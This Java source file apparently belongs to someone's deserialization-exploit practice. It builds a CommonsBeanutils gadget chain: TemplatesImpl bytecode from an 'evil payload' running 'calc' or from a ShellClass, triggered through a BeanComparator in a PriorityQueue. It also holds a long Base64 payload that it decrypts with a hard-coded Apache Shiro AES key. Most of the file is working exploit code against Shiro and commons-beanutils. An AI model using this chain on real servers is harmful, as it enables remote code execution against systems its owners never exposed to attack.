package Seri;

import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;


import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;

import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;

import org.apache.tomcat.dbcp.dbcp2.*;
import org.hibernate.transform.Transformers;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

public class Test {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Utils.getEvilPayload("calc");
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates ,"_name" ,"xxx");
        Utils.setValue(templates ,"_class" ,null);
//        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{
                ClassPool.getDefault().get(ShellClass.class.getName()).toBytecode()
        });
        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());


        BeanComparator comparator = new BeanComparator(null ,String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<Object> priorityQueue = new PriorityQueue(2 , comparator);
        priorityQueue.add("1");
        priorityQueue.add("1");

        Utils.setValue(comparator ,"property" ,"outputProperties");
//        Utils.setValue(comparator ,"queue" ,new Object[]{templates ,templates});


//        String payload = Utils.serialize(priorityQueue ,"bin/CC4CCGadgets6.bin");
        String payload = "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";
        String key = "iPBr07quEyXvGESoxmCtcQ==";

        AesCipherService aes = new AesCipherService();
        byte[] keyBytes = Base64.getDecoder().decode(key);
        System.out.println(aes.decrypt(Base64.getDecoder().decode(payload) , keyBytes ).toString());



    }

    public static void serialize(Object object ,String filename) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(object);
        oos.close();

        FileOutputStream fos = new FileOutputStream(filename);
        barr.writeTo(fos);
        fos.close();

        System.out.println(barr);
    }
    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
        ois.close();
    }
}
